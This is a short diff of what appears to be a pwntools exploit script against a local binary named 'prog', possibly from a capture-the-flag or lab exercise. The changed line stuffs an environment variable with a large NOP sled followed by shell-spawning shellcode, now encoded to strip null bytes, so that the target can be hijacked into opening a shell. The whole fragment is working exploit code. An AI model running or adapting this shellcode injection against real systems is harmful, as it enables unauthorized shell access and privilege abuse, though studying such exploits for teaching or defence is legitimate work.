@@ -4,7 +4,7 @@ context.binary = 'prog'
 e = context.binary
 
 duzo = 0x1ffcd
-argz = {'A':asm(shellcraft.nop()*duzo + shellcraft.sh())}
+argz = {'A':asm(shellcraft.nop())*duzo + encode(asm(shellcraft.sh()), b'\0')}
 pa = os.environ.get('LD_LIBRARY_PATH')
 if pa:
     argz.update({'LD_LIBRARY_PATH':pa})
